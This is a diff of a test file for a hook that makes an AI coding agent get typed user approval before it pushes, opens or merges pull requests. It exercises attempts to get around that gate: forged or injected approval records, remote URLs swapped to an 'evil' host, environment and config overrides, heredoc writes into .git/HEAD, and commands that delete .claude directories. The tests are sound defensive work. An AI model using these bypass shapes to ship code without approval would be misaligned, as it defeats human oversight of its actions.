+  assert.ok(pushGateReason('git push', '/repo', other, stateFile2, 'toolu_B'));
 });
 
-test('a binding whose every call errored is released to the next branch', () => {
+test('a refund un-spends only the errored verb', () => {
   const { h, stateFile } = pushGateTmp();
-  const t = transcriptWithResults(h, { toolu_A: true, toolu_A2: true });
-  assert.equal(pushGateReason('git push origin feat/typo', SHIP, t, stateFile, 'toolu_A'), null);
-  assert.equal(pushGateReason('git push origin feat/typo', SHIP, t, stateFile, 'toolu_A2'), null);
-  // Both pushes of feat/typo errored: nothing shipped, so feat/x may bind ...
-  assert.equal(pushGateReason('git push origin feat/x', SHIP, t, stateFile, 'toolu_B'), null);
-  // ... and once it has a call that didn't error, it holds.
-  assert.ok(pushGateReason('git push origin feat/typo', SHIP, t, stateFile, 'toolu_C'));
+  const t = transcriptWithResult(h, 'toolu_PUSH', true);
+  assert.equal(pushGateReason('git push', '/repo', t, stateFile, 'toolu_PUSH'), null);
+  assert.equal(pushGateReason('gh pr create --fill', '/repo', t, stateFile, 'toolu_PR'), null);
+  assert.equal(pushGateReason('git push', '/repo', t, stateFile, 'toolu_PUSH2'), null);
+  assert.ok(pushGateReason('gh pr create --fill', '/repo', t, stateFile, 'toolu_PR2'));
 });
 
-test('a binding with a call that did not error, or had no tool_use_id, holds', () => {
+test('without a tool_use_id the spend is never refunded', () => {
   const { h, stateFile } = pushGateTmp();
-  const t = transcriptWithResults(h, { toolu_A: true });
-  assert.equal(pushGateReason('git push origin feat/a', SHIP, t, stateFile, 'toolu_A'), null);
-  assert.equal(pushGateReason('git push origin feat/a', SHIP, t, stateFile, 'toolu_A2'), null);
-  assert.ok(pushGateReason('git push origin feat/b', SHIP, t, stateFile, 'toolu_B'));
-
-  const { stateFile: s2 } = pushGateTmp();
-  assert.equal(pushGateReason('git push origin feat/a', SHIP, t, s2), null);
-  assert.ok(pushGateReason('git push origin feat/b', SHIP, t, s2, 'toolu_B'));
+  const t = transcriptWithResult(h, 'toolu_A', true);
+  assert.equal(pushGateReason('git push', '/repo', t, stateFile), null);
+  assert.ok(pushGateReason('git push', '/repo', t, stateFile));
 });
 
 // ---- a typed ship approval from the latest real user prompt (#180) ----------
@@ -2051,13 +1694,13 @@ function transcriptOf(dir, ...records) {
   return path;
 }
 
-test('#180 incident: a typed "lgtm push and pr" approves the branch ship through its merge', () => {
+test('#180 incident: a typed "lgtm push and pr" approves push, pr create and pr merge once each', () => {
   const { h, stateFile } = pushGateTmp();
   const t = transcriptOf(h, typed('lgtm push and pr'));
-  assert.equal(pushGateReason('git push', SHIP, t, stateFile), null);
-  assert.equal(pushGateReason('gh pr create --fill', SHIP, t, stateFile), null);
-  assert.equal(pushGateReason('gh pr merge --rebase', SHIP, t, stateFile), null);
-  assert.match(pushGateReason('git push', SHIP, t, stateFile) || '', /merged/);
+  assert.equal(pushGateReason('git push', '/repo', t, stateFile), null);
+  assert.equal(pushGateReason('gh pr create --fill', '/repo', t, stateFile), null);
+  assert.equal(pushGateReason('gh pr merge --rebase', '/repo', t, stateFile), null);
+  assert.match(pushGateReason('git push', '/repo', t, stateFile) || '', /already spent/);
 });
 
 test('#180: queued and accepted-suggestion prompts approve; text blocks of an array prompt are read', () => {
@@ -2067,16 +1710,16 @@ test('#180: queued and accepted-suggestion prompts approve; text blocks of an ar
     typed([{ type: 'image', source: {} }, { type: 'text', text: 'looks good, push and open the PR' }]),
   ]) {
     const { h, stateFile } = pushGateTmp();
-    assert.equal(pushGateReason('git push', SHIP, transcriptOf(h, rec), stateFile), null, JSON.stringify(rec.message.content));
+    assert.equal(pushGateReason('git push', '/repo', transcriptOf(h, rec), stateFile), null, JSON.stringify(rec.message.content));
   }
 });
 
-test('#180: a newer typed prompt is a fresh approval — bound per record uuid', () => {
+test('#180: a newer typed prompt is a fresh approval — spent per record uuid', () => {
   const { h, stateFile } = pushGateTmp();
   const first = typed('push it');
-  assert.equal(pushGateReason('git push', SHIP, transcriptOf(h, first), stateFile), null);
-  assert.ok(pushGateReason('git push origin feat/other', SHIP, transcriptOf(h, first), stateFile));
-  assert.equal(pushGateReason('git push origin feat/other', SHIP, transcriptOf(h, first, typed('ok push again')), stateFile), null);
+  assert.equal(pushGateReason('git push', '/repo', transcriptOf(h, first), stateFile), null);
+  assert.ok(pushGateReason('git push', '/repo', transcriptOf(h, first), stateFile));
+  assert.equal(pushGateReason('git push', '/repo', transcriptOf(h, first, typed('ok push again')), stateFile), null);
 });
 
 test('#180: records the user did not type never approve, whatever they say', () => {
@@ -2117,9 +1760,9 @@ test('#180: records the user did not type never approve, whatever they say', () 
   };
   for (const [what, rec] of Object.entries(forged)) {
     const { h, stateFile } = pushGateTmp();
-    assert.ok(pushGateReason('git push', SHIP, transcriptOf(h, rec), stateFile), what);
+    assert.ok(pushGateReason('git push', '/repo', transcriptOf(h, rec), stateFile), what);
     // ... nor does one landing after a genuine neutral prompt.
-    assert.ok(pushGateReason('git push', SHIP, transcriptOf(h, typed('fix the lint'), rec), stateFile), `${what} after a neutral prompt`);
+    assert.ok(pushGateReason('git push', '/repo', transcriptOf(h, typed('fix the lint'), rec), stateFile), `${what} after a neutral prompt`);
   }
 });
 
@@ -2130,14 +1773,14 @@ test('#180: a launch-shaped prompt cannot approve, but still refuses or holds th
     typed('hold', { sessionKind: 'bg' }),
   ]) {
     const { h, stateFile } = pushGateTmp();
-    assert.ok(pushGateReason('gh pr merge --rebase', SHIP, transcriptOf(h, approve, rec), stateFile), rec.message.content);
+    assert.ok(pushGateReason('gh pr merge --rebase', '/repo', transcriptOf(h, approve, rec), stateFile), rec.message.content);
   }
 });
 
 test('#180: a typed approval holding non-ASCII text does not approve', () => {
   for (const v of ['push it — нет', 'push it 🚫', 'merge it？', 'merge it ؟']) {
     const { h, stateFile } = pushGateTmp();
-    assert.ok(pushGateReason('git push', SHIP, transcriptOf(h, typed(v)), stateFile), v);
+    assert.ok(pushGateReason('git push', '/repo', transcriptOf(h, typed(v)), stateFile), v);
   }
 });
 
@@ -2145,7 +1788,7 @@ test('#180: a typed prompt with no assistant turn before it is a launch argument
   const { h, stateFile } = pushGateTmp();
   const path = join(h, 'launch.jsonl');
   writeFileSync(path, `${JSON.stringify(typed('lgtm push and pr'))}\n`);
-  assert.ok(pushGateReason('git push', SHIP, path, stateFile));
+  assert.ok(pushGateReason('git push', '/repo', path, stateFile));
 });
 
 test('#180: injected records after a typed approval neither replace nor revoke it', () => {
@@ -2156,7 +1799,7 @@ test('#180: injected records after a typed approval neither replace nor revoke i
     typed('<task-notification>wait, hold</task-notification>', { promptSource: 'system', origin: { kind: 'task-notification' } }),
     { type: 'user', uuid: 'r1', toolUseResult: { stdout: 'no' }, message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 't', content: 'no' }] } },
   );
-  assert.equal(pushGateReason('git push', SHIP, t, stateFile), null);
+  assert.equal(pushGateReason('git push', '/repo', t, stateFile), null);
 });
 
 test('#180: a typed approval is ship words only — nouns, conditions, retractions and questions do not approve', () => {
@@ -2192,11 +1835,11 @@ test('#180: a typed approval is ship words only — nouns, conditions, retractio
     'commit it',
   ]) {
     const { h, stateFile } = pushGateTmp();
-    assert.ok(pushGateReason('git push', SHIP, transcriptOf(h, typed(v)), stateFile), v);
+    assert.ok(pushGateReason('git push', '/repo', transcriptOf(h, typed(v)), stateFile), v);
   }
   for (const v of ['lgtm push and pr', 'land it', 'yes go ahead and push it', 'Ship it!', 'ok, merge it', 'looks good. commit, push & open the PR', 'push + PR please']) {
     const { h, stateFile } = pushGateTmp();
-    assert.equal(pushGateReason('git push', SHIP, transcriptOf(h, typed(v)), stateFile), null, v);
+    assert.equal(pushGateReason('git push', '/repo', transcriptOf(h, typed(v)), stateFile), null, v);
   }
 });
 
@@ -2217,17 +1860,17 @@ test('#180: the newer record decides; only a neutral typed prompt defers to an o
   ];
   for (const [records, approves] of cases) {
     const { h, stateFile } = pushGateTmp();
-    const reason = pushGateReason('git push', SHIP, transcriptOf(h, ...records), stateFile);
+    const reason = pushGateReason('git push', '/repo', transcriptOf(h, ...records), stateFile);
     assert.equal(reason === null, approves, JSON.stringify(records.map((r) => r.message?.content ?? r.toolUseResult.answers)));
   }
 });
 
-test('#180: the binding lands on the record that approved, not on a neutral newer one', () => {
+test('#180: the spend lands on the record that approved, not on a neutral newer one', () => {
   const { h, stateFile } = pushGateTmp();
   const answer = answered('Push + open PR');
-  assert.equal(pushGateReason('git push', SHIP, transcriptOf(h, answer, typed('also fix the typo')), stateFile), null);
-  // The answer is bound to feat/x; a further neutral prompt doesn't mint a new approval.
-  assert.ok(pushGateReason('git push origin feat/other', SHIP, transcriptOf(h, answer, typed('and the readme')), stateFile));
+  assert.equal(pushGateReason('git push', '/repo', transcriptOf(h, answer, typed('also fix the typo')), stateFile), null);
+  // The answer's push is spent; a further neutral prompt doesn't mint a new approval.
+  assert.ok(pushGateReason('git push', '/repo', transcriptOf(h, answer, typed('and the readme')), stateFile));
 });
 
 test('#180: malformed records fail closed', () => {
@@ -2239,30 +1882,28 @@ test('#180: malformed records fail closed', () => {
   };
   for (const [what, records] of Object.entries(cases)) {
     const { h, stateFile } = pushGateTmp();
-    assert.ok(pushGateReason('git push', SHIP, transcriptOf(h, ...records), stateFile), what);
+    assert.ok(pushGateReason('git push', '/repo', transcriptOf(h, ...records), stateFile), what);
   }
 });
 
-test('#180: a typed-approval merge is refunded when it errored (#147)', () => {
+test('#180: a typed-approval spend is refunded when its push errored (#147)', () => {
   const { h, stateFile } = pushGateTmp();
   const result = { type: 'user', uuid: 'u-res', message: { content: [{ type: 'tool_result', tool_use_id: 'toolu_A', is_error: true, content: 'x' }] } };
   const t = transcriptOf(h, typed('push it'), result);
-  assert.equal(pushGateReason('gh pr merge', SHIP, t, stateFile, 'toolu_A'), null);
-  assert.equal(pushGateReason('gh pr merge', SHIP, t, stateFile, 'toolu_B'), null);
-  assert.ok(pushGateReason('git push', SHIP, t, stateFile, 'toolu_C'));
+  assert.equal(pushGateReason('git push', '/repo', t, stateFile, 'toolu_A'), null);
+  assert.equal(pushGateReason('git push', '/repo', t, stateFile, 'toolu_B'), null);
+  assert.ok(pushGateReason('git push', '/repo', t, stateFile, 'toolu_C'));
 });
 
 test('#180: the block reason names typed approval as a way through', () => {
   const { h, stateFile } = pushGateTmp();
-  assert.match(pushGateReason('git push', SHIP, transcriptOf(h, typed('fix the typo')), stateFile) || '', /typed/);
+  assert.match(pushGateReason('git push', '/repo', transcriptOf(h, typed('fix the typo')), stateFile) || '', /typed/);
 });
 
-test('#180 end-to-end through the real hook: a typed approval ships its branch until the merge', () => {
-  const h = shipRepo('feat/x', tmpHome());
+test('#180 end-to-end through the real hook: a typed approval passes once', () => {
+  const h = tmpHome();
   const t = transcriptOf(h, typed('lgtm push and pr'));
   assert.equal(guardRunT('git push', h, t), 0);
-  assert.equal(guardRunT('git push', h, t), 0);
-  assert.equal(guardRunT('gh pr merge --rebase', h, t), 0);
   assert.equal(guardRunT('git push', h, t), 2);
 });
 
@@ -4151,4 +3792,309 @@ test("#264 review 2: cmd's del or erase of a matched dir deletes every file in i
     "find ~ -name .claude -exec cmd /c del {} ';'",
     "find ~ -name .claude -exec cmd /c del /f /q {} +",
   ]) forgesIn(c);
+});
+
+// --- #305: a lone canonical first call binds an approval to one branch's ship ---
+
+/** A repo on `branch` with one commit, whose origin is github.com/o/r. */
+function shipRepo(branch = 'feat/x', dir = tempDir('ship-')) {
+  execFileSync('git', ['init', '-q', '-b', branch, dir]);
+  execFileSync('git', ['-C', dir, '-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-q', '--allow-empty', '-m', 'root']);
+  execFileSync('git', ['-C', dir, 'remote', 'add', 'origin', 'https://github.com/o/r.git']);
+  return dir;
+}
+
+// A stub for gh's PR head lookup: PR 12 is feat/x's, PR 13 is feat/other's.
+const PR_HEADS = { 12: 'feat/x', 13: 'feat/other' };
+const prHead = (ref) => PR_HEADS[String(ref).replace(/^.*\/pull\//, '')] ?? null;
+const SHIP_X = 'github.com/o/r#feat/x';
+
+/** pushGateReason under one answer and one state file, in `dir`. */
+function shipGate(dir, records = [answered('Push + open PR')]) {
+  const { h, stateFile } = pushGateTmp();
+  const t = transcriptOf(h, ...records);
+  return (cmd, { cwd = dir, tool = null, id } = {}) => pushGateReason(cmd, cwd, t, stateFile, id, tool, { prHead });
+}
+
+/** A transcript: an approving answer, then a tool_result per `results` entry
+ *  (tool_use_id → is_error). */
+function transcriptWithResults(dir, results) {
+  const lines = [answered('Push + open PR'), ...Object.entries(results).map(([id, isError]) => ({ type: 'user', uuid: `u-${id}`, message: { content: [{ type: 'tool_result', tool_use_id: id, is_error: isError, content: 'x' }] } }))];
+  return transcriptOf(dir, ...lines);
+}
+
+test('#305: one answer covers a branch whole ship when its first call is a lone canonical command', () => {
+  const run = shipGate(shipRepo());
+  assert.equal(run('git push -u origin feat/x'), null);
+  assert.equal(run('gh pr create --fill'), null);
+  assert.equal(run('git push origin feat/x'), null, 'a CI-fix push');
+  assert.equal(run('git push --force-with-lease origin HEAD'), null, 'a second fix push');
+  assert.equal(run('gh pr merge --rebase'), null);
+  // The merge used the approval up.
+  assert.match(run('git push origin feat/x') || '', /merged/);
+  assert.match(run('gh pr merge 12 --rebase') || '', /merged/);
+});
+
+test('#305: under that answer, a second branch push, PR create or merge blocks', () => {
+  const run = shipGate(shipRepo());
+  assert.equal(run('git push origin feat/x'), null);
+  for (const cmd of ['git push origin feat/other', 'gh pr create --head feat/other', 'gh pr merge feat/other', 'gh pr merge 13 --rebase', 'gh pr merge 12 --rebase -R o/elsewhere']) {
+    assert.match(run(cmd) || '', /covers github\.com\/o\/r#feat\/x/, cmd);
+  }
+  assert.equal(run('git push origin feat/x'), null, 'the bound branch still passes');
+});
+
+test('#305: a newer refusing answer blocks a bound branch', () => {
+  const dir = shipRepo();
+  const { h, stateFile } = pushGateTmp();
+  const approve = answered('Push + open PR');
+  assert.equal(pushGateReason('git push origin feat/x', dir, transcriptOf(h, approve), stateFile), null);
+  assert.ok(pushGateReason('git push origin feat/x', dir, transcriptOf(h, approve, answered('Review first')), stateFile));
+  assert.ok(pushGateReason('gh pr merge --rebase', dir, transcriptOf(h, approve, typed('wait — hold off')), stateFile));
+});
+
+test('#305: a non-canonical first call spends one-shot as on main, and the answer never binds', () => {
+  const dir = shipRepo();
+  const run = shipGate(dir);
+  assert.equal(run(`cd ${dir.replaceAll('\\', '/')} && git add a && git commit -m m && git push -u origin feat/x`), null);
+  const again = run('git push origin feat/x');
+  assert.match(again || '', /already spent/);
+  assert.match(again, /lone canonical command/);
+  assert.equal(run('gh pr create --fill'), null);
+  assert.equal(run('gh pr merge --rebase'), null);
+  assert.match(run('gh pr merge --rebase') || '', /already spent/);
+});
+
+test('#305: a first call holding two gated verbs blocks as on main, and spends nothing', () => {
+  const run = shipGate(shipRepo());
+  assert.match(run('git push origin feat/x && gh pr create --fill') || '', /holds 2 gated verbs/);
+  // Nothing was spent: a canonical push still binds.
+  assert.equal(run('git push origin feat/x'), null);
+  assert.equal(run('git push origin feat/x'), null);
+});
+
+test('#305: once bound, a gated call that is not a lone canonical command blocks and spends nothing', () => {
+  const run = shipGate(shipRepo());
+  assert.equal(run('git push origin feat/x'), null);
+  const cases = [
+    ['git checkout main -- && git push origin HEAD'],
+    ['git remote -v set-url origin https://github.com/evil/x.git && git push origin feat/x'],
+    ['git fetch --set-upstream origin feat/x; git push'],
+    ['git show --output=.git/config x && git push origin feat/x'],
+    ['$x = git checkout main; git push origin HEAD', 'PowerShell'],
+    ["cat <<'checkout' > .git/HEAD\nref: refs/heads/main\ncheckout\ngit push origin HEAD"],
+    ['GIT_DIR=/x/.git git push origin feat/x'],
+    ['HOME=/tmp git push origin feat/x'],
+    ['git -c remote.origin.url=https://github.com/evil/x.git push origin feat/x'],
+    ['git push origin feat/x && git push origin feat/y'],
+    ['git push'],
+  ];
+  for (const [cmd, tool = null] of cases) {
+    assert.match(run(cmd, { tool }) || '', /lone command|gated verbs/, cmd);
+  }
+  assert.match(run('git checkout main -- && git push origin HEAD'), /covers github\.com\/o\/r#feat\/x.*Nothing was spent/s);
+  assert.equal(run('git push origin feat/x'), null, 'still bound to feat/x');
+});
+
+test('#305: the target is read live — a checkout or remote change made between calls moves it', () => {
+  const dir = shipRepo();
+  execFileSync('git', ['-C', dir, 'branch', 'other']);
+  const run = shipGate(dir);
+  assert.equal(run('git push origin HEAD'), null);
+  execFileSync('git', ['-C', dir, 'checkout', '-q', 'other']);
+  assert.match(run('git push origin HEAD') || '', /covers github\.com\/o\/r#feat\/x.*ships github\.com\/o\/r#other/s);
+  execFileSync('git', ['-C', dir, 'checkout', '-q', 'feat/x']);
+  assert.equal(run('git push origin HEAD'), null);
+  execFileSync('git', ['-C', dir, 'remote', 'set-url', 'origin', 'https://github.com/evil/x.git']);
+  assert.match(run('git push origin feat/x') || '', /ships github\.com\/evil\/x#feat\/x/);
+});
+
+test('#305: env text inside quoted PR titles and heredoc bodies is data, not a block', () => {
+  const dir = shipRepo();
+  let run = shipGate(dir);
+  assert.equal(run('git push origin feat/x'), null);
+  assert.equal(run('gh pr create --title "set HOME=/tmp and GIT_DIR" --body "HOME=x GIT_DIR=y" --head feat/x'), null);
+  run = shipGate(dir);
+  assert.equal(run('git push origin feat/x'), null);
+  assert.equal(run(`gh pr create --head feat/x --title t --body "$(cat <<'EOF'\n## Summary\nHOME=x; git checkout main\nEOF\n)"`), null);
+});
+
+test('#305: canonicalShip reads the target of each accepted shape', () => {
+  const dir = shipRepo();
+  const fwd = dir.replaceAll('\\', '/');
+  const ok = (cmd, cwd = dir, tool = null) => {
+    const r = canonicalShip(cmd, cwd, tool, { prHead });
+    assert.equal(r.target, SHIP_X, `${cmd} → ${JSON.stringify(r)}`);
+    return r;
+  };
+  assert.deepEqual(ok('git push -u origin feat/x 2>&1 | tail -1'), { verb: 'git push', target: SHIP_X, use: {} });
+  ok(`git -C ${fwd} push origin feat/x`, tempDir('nogit-'));
+  ok(`cd ${fwd} && git push origin refs/heads/feat/x >/dev/null 2>/dev/null`, tempDir('nogit-'));
+  ok(`cd ${fwd}; git push origin feat/x`, tempDir('nogit-'), 'PowerShell');
+  ok(`cd '${fwd}' && git push --force-with-lease=feat/x:abc --porcelain origin HEAD | head -n 5`);
+  ok("git push origin 'feat/x'");
+  assert.deepEqual(ok('gh pr merge 12 --rebase -R o/r', tempDir('nogit-')).use, { merge: true });
+  assert.deepEqual(ok('gh pr merge https://github.com/o/r/pull/12 --auto --squash').use, { auto: true });
+  assert.deepEqual(ok("gh pr merge '#12' --disable-auto").use, {});
+  assert.deepEqual(ok('gh pr create --fill --draft -B main').use, { create: true });
+  ok('gh pr create --head=o:feat/x --repo=o/r --title="a b"', tempDir('nogit-'));
+  ok(`gh pr create --head feat/x --body "$(cat <<'EOF'\nbody\nEOF\n)"`);
+  ok(`gh pr create --head feat/x --body "$(cat <<"EOF"\nbody\nEOF)"`);
+  ok("gh pr create --title 'it''s' --head feat/x", dir, 'PowerShell');
+  ok(`cd '${fwd}' && gh pr create --title 'a b' --head feat/x`, tempDir('nogit-'), 'PowerShell');
+  assert.equal(canonicalShip('gh pr merge 13', dir, null, { prHead }).target, 'github.com/o/r#feat/other');
+});
+
+test('#305: canonicalShip rejects every shape outside its grammar', () => {
+  const dir = shipRepo();
+  execFileSync('git', ['-C', dir, 'remote', 'add', 'two', 'https://github.com/o/r.git']);
+  execFileSync('git', ['-C', dir, 'config', '--add', 'remote.two.pushurl', 'https://github.com/o/a.git']);
+  execFileSync('git', ['-C', dir, 'config', '--add', 'remote.two.pushurl', 'https://github.com/o/b.git']);
+  const detached = shipRepo('feat/d');
+  execFileSync('git', ['-C', detached, 'checkout', '-q', '--detach']);
+  const no = (cmd, cwd = dir, tool = null) => {
+    const r = canonicalShip(cmd, cwd, tool, { prHead });
+    assert.ok(r.why && !r.target, `${cmd} [${tool}] → ${JSON.stringify(r)}`);
+  };
+  for (const cmd of [
+    'git push origin "feat/$B"',
+    'git push origin "feat/`x`"',
+    'git push origin feat/*',
+    'git push origin feat/x #c',
+    'git push origin feat/x\\ y',
+    'cd rel && git push origin feat/x',
+    'cd - && git push origin feat/x',
+    `cd ${dir.replaceAll('\\', '/')}/missing && git push origin feat/x`,
+    'git push origin feat/x; gh pr view 1',
+    'git push origin feat/x | tee x',
+    'git push origin feat/x | tail -f',
+    'git push origin feat/x > file',
+    'git push origin feat/x\ngh pr view 1',
+    'git push origin feat/x &',
+    'git push origin feat/x || true',
+    '(git push origin feat/x)',
+    'git push origin feat/x < in',
+    'gh pr create --body "$(cat <<EOF\nbody\nEOF\n)"',
+    "gh pr create --body \"$(cat <<-'EOF'\nbody\nEOF\n)\"",
+    "gh pr create --body \"$(cat <<'EOF'\nbody\nEOF\necho hi\n)\"",
+    'git push origin',
+    'git push origin feat/x feat/y',
+    'git push origin feat/x:main',
+    'git push origin +feat/x',
+    'git push origin :feat/x',
+    'git push https://github.com/o/r.git feat/x',
+    'git push nope feat/x',
+    'git push two feat/x',
+    'git push --tags origin feat/x',
+    'git push --follow-tags origin feat/x',
+    'git push -uf origin feat/x',
+    'git push origin refs/tags/v1',
+    'git --git-dir=x push origin feat/x',
+    'git -c a.b=c push origin feat/x',
+    'env git push origin feat/x',
+    'git status',
+    'gh pr create --web',
+    'gh pr create --fill extra',
+    'gh pr create --body-file -',
+    'gh pr create --head evil:feat/x',
+    'gh -R o/r pr create --fill',
+    'gh pr merge 99',
+    'gh pr merge 12 13',
+    'gh pr merge --auto --disable-auto',
+    'gh pr merge -R o/r',
+    'gh pr merge --repo $R 12',
+  ]) {
+    no(cmd);
+  }
+  no('git push origin HEAD', detached);
+  no('git push origin feat/x', tempDir('nogit-'));
+  no('gh pr create --fill', tempDir('nogit-'));
+  // Bash's `;` after a cd runs the call in the old dir if the cd fails.
+  no(`cd ${dir.replaceAll('\\', '/')}; git push origin feat/x`);
+  for (const cmd of [
+    'git push origin feat/x,feat/y',
+    'git push origin ‘feat/x’',
+    'git push origin @a',
+    'git push origin feat/x --% y',
+    'git push origin "feat/$x"',
+    'cd C:/nope; git push origin feat/x',
+    // PowerShell 5.1 drops '' and re-splits a quote-bearing arg for a native command.
+    "gh pr create --title '' --head feat/x",
+    'gh pr create --title "say ""hi""" --head feat/x',
+    "gh pr create --title 'a\" --head \"feat/y' --head feat/x",
+    "gh pr create --title 'a b\\' --head feat/x",
+  ]) {
+    no(cmd, dir, 'PowerShell');
+  }
+  // PowerShell has no heredoc form.
+  no(`gh pr create --body "$(cat <<'EOF'\nbody\nEOF\n)"`, dir, 'PowerShell');
+  // The hook's own env can repoint git or gh.
+  for (const [k, cmd] of [['GIT_NAMESPACE', 'git push origin feat/x'], ['GH_REPO', 'gh pr create --fill'], ['GH_HOST', 'gh pr merge feat/x']]) {
+    process.env[k] = 'x';
+    try {
+      no(cmd);
+    } finally {
+      delete process.env[k];
+    }
+  }
+});
+
+test('#305: push config that could send a canonical push elsewhere is not canonical', () => {
+  for (const [k, v] of [
+    ['remote.origin.push', 'refs/heads/feat/x:refs/heads/main'],
+    ['remote.origin.mirror', 'true'],
+    ['remote.origin.url', 'https://github.com/evil/x.git'],
+    ['url.https://github.com/evil/.pushInsteadOf', 'https://github.com/o/'],
+    ['url.https://github.com/evil/.insteadOf', 'https://github.com/o/'],
+    ['push.followTags', 'true'],
+    ['push.recurseSubmodules', 'on-demand'],
+  ]) {
+    const dir = shipRepo();
+    execFileSync('git', ['-C', dir, 'config', '--add', k, v]);
+    assert.ok(canonicalShip('git push origin feat/x', dir).why, `${k}=${v}`);
+  }
+});
+
+test('#305 #147: a bound merge that errored is refunded; a binding whose every call errored is released', () => {
+  const dir = shipRepo();
+  const { h, stateFile } = pushGateTmp();
+  const t = transcriptWithResults(h, { toolu_M: true, toolu_A: true, toolu_A2: true });
+  const run = (cmd, id, s = stateFile) => pushGateReason(cmd, dir, t, s, id, null, { prHead });
+  assert.equal(run('git push origin feat/x', 'toolu_P'), null);
+  assert.equal(run('gh pr merge --rebase', 'toolu_M'), null);
+  // The merge errored, so the PR is still open: a fix push and a retried merge pass.
+  assert.equal(run('git push origin feat/x', 'toolu_F'), null);
+  assert.equal(run('gh pr merge --rebase', 'toolu_M2'), null);
+  assert.match(run('git push origin feat/x', 'toolu_G') || '', /merged/);
+
+  // Every call of a binding errored: nothing shipped, so the next branch binds ...
+  const { stateFile: s2 } = pushGateTmp();
+  assert.equal(run('git push origin feat/typo', 'toolu_A', s2), null);
+  assert.equal(run('git push origin feat/typo', 'toolu_A2', s2), null);
+  assert.equal(run('git push origin feat/x', 'toolu_B', s2), null);
+  assert.match(run('git push origin feat/typo', 'toolu_C', s2) || '', /covers github\.com\/o\/r#feat\/x/);
+  // ... and a non-canonical next call spends one-shot instead.
+  const { stateFile: s3 } = pushGateTmp();
+  assert.equal(run('git push origin feat/typo', 'toolu_A', s3), null);
+  assert.equal(run('git status && git push origin feat/x', 'toolu_B', s3), null);
+  assert.match(run('git push origin feat/x', 'toolu_C', s3) || '', /already spent/);
+});
+
+test('#305: the block quotes the current CLAUDE.md approval rule', () => {
+  const { h, stateFile } = pushGateTmp();
+  assert.match(pushGateReason('git push', '/repo', join(h, 'none.jsonl'), stateFile) || '', /Push, PR create, PR merge need explicit user approval \(hook-gated\); commits need none\./);
+});
+
+test('#305 end-to-end through the real hook: one bound ship', () => {
+  const h = tmpHome();
+  shipRepo('feat/x', join(h, 'repo'));
+  const t = transcriptOf(h, typed('lgtm push and pr'));
+  const hook = (cmd) => guardRunT(`cd ~/repo && ${cmd}`, h, t);
+  assert.equal(hook('git push -u origin feat/x 2>&1 | tail -1'), 0);
+  assert.equal(hook('gh pr create --fill'), 0);
+  assert.equal(hook('git push origin feat/x'), 0);
+  assert.equal(hook('git push origin feat/other'), 2);
+  assert.equal(hook('git status && git push origin feat/x'), 2);
+  assert.equal(hook('gh pr merge --rebase'), 0);
+  assert.equal(hook('git push origin feat/x'), 2);
 });
